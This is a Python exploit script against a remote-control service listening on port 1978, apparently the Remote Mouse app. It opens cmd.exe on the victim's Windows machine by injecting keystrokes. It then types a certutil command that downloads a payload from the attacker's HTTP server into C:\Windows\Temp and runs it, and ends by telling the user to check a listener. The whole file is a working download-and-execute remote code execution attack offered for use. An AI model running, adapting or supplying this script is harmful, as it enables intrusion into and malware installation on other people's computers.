#!/usr/bin/python

from socket import socket, AF_INET, SOCK_STREAM, gethostbyname
from time import sleep
import sys
import string

# Global Variables
target = socket(AF_INET, SOCK_STREAM)
port = 1978

# Ensure command-line arguments are passed correctly
try:
    rhost = sys.argv[1]  # Target host (either IP or domain name)
    lhost = sys.argv[2]  # Local host (attacker's server)
    payload = sys.argv[3]  # Payload to deliver
except IndexError:
    print(f"Usage: python {sys.argv[0]} <target-ip/domain> <local-http-server-ip> <payload-name>")
    sys.exit(1)

# Resolve the domain to an IP address if necessary
try:
    print(f"Resolving Target IP for {rhost}...")
    rhost_ip = gethostbyname(rhost)
    print(f"Resolved Target IP: {rhost_ip}, Port: {port}")
except Exception as e:
    print(f"Error resolving {rhost}: {e}")
    sys.exit(1)

# Payload string mapping for hex conversion
characters = {
    "A": "41", "B": "42", "C": "43", "D": "44", "E": "45", "F": "46", "G": "47", "H": "48", "I": "49", "J": "4a", 
    "K": "4b", "L": "4c", "M": "4d", "N": "4e", "O": "4f", "P": "50", "Q": "51", "R": "52", "S": "53", "T": "54", 
    "U": "55", "V": "56", "W": "57", "X": "58", "Y": "59", "Z": "5a", "a": "61", "b": "62", "c": "63", "d": "64", 
    "e": "65", "f": "66", "g": "67", "h": "68", "i": "69", "j": "6a", "k": "6b", "l": "6c", "m": "6d", "n": "6e", 
    "o": "6f", "p": "70", "q": "71", "r": "72", "s": "73", "t": "74", "u": "75", "v": "76", "w": "77", "x": "78", 
    "y": "79", "z": "7a", "1": "31", "2": "32", "3": "33", "4": "34", "5": "35", "6": "36", "7": "37", "8": "38", 
    "9": "39", "0": "30", " ": "20", "+": "2b", "=": "3d", "/": "2f", "_": "5f", "<": "3c", ">": "3e", "[": "5b", 
    "]": "5d", "!": "21", "@": "40", "#": "23", "$": "24", "%": "25", "^": "5e", "&": "26", "*": "2a", "(": "28", 
    ")": "29", "-": "2d", "'": "27", '"': "22", ":": "3a", ";": "3b", "?": "3f", "`": "60", "~": "7e", "\\": "5c", 
    "|": "7c", "{": "7b", "}": "7d", ",": "2c", ".": "2e"
}

# Function to open the Windows Command Prompt (cmd.exe)
def openCMD():
    print("[+] Opening cmd.exe...")
    target.sendto(bytes.fromhex("6f70656e66696c65202f432f57696e646f77732f53797374656d33322f636d642e6578650a"), (rhost_ip, port))

# Function to send a string to the target (converts each character to hex and sends it)
def SendString(string):
    print(f"[+] Sending string: {string}")
    for char in string:
        hex_str = "7574663820" + characters[char] + "0a"  # Convert char to hex and add padding
        target.sendto(bytes.fromhex(hex_str), (rhost_ip, port))  # Send the hex-encoded byte string
        sleep(0.03)

# Function to send the "Enter" key (Return key)
def SendReturn():
    target.sendto(bytes.fromhex("6b657920203352544e"), (rhost_ip, port))  # 'key 3RTN' - Similar to 'Remote Mouse' mobile app
    sleep(0.5)

# Exploit execution function
def exploit():
    print("[+] Starting exploit in 3...2...1...")
    sleep(2)
    
    # Send the command to open cmd.exe
    openCMD()
    sleep(1)

    # Craft and send payload to target (downloads it from the attackerâ€™s local server)
    print("[+] Delivering payload to target...")
    print("Localhost: {lhost}")
    SendString(f"certutil.exe -urlcache -f http://{lhost}/{payload} C:\\Windows\\Temp\\{payload}")
    SendReturn()

    # Trigger execution of the payload
    print("[+] Executing payload from Temp folder...")
    SendString(f"C:\\Windows\\Temp\\{payload}")
    SendReturn()
    
    print("[+] Exploit complete! Check your listener.")

# Main function to establish a connection and execute the exploit
def main():
    try:
        print("[+] Connecting to target...")
        target.connect((rhost_ip, port))  # Establish socket connection
    except Exception as e:
        print(f"Error connecting to {rhost_ip}:{port} - {e}")
        sys.exit(1)
    
    # Run exploit
    exploit()
    
    # Close the connection after exploit completes
    target.close()
    print("[+] Connection closed.")

# Entry point for script execution
if __name__ == "__main__":
    main()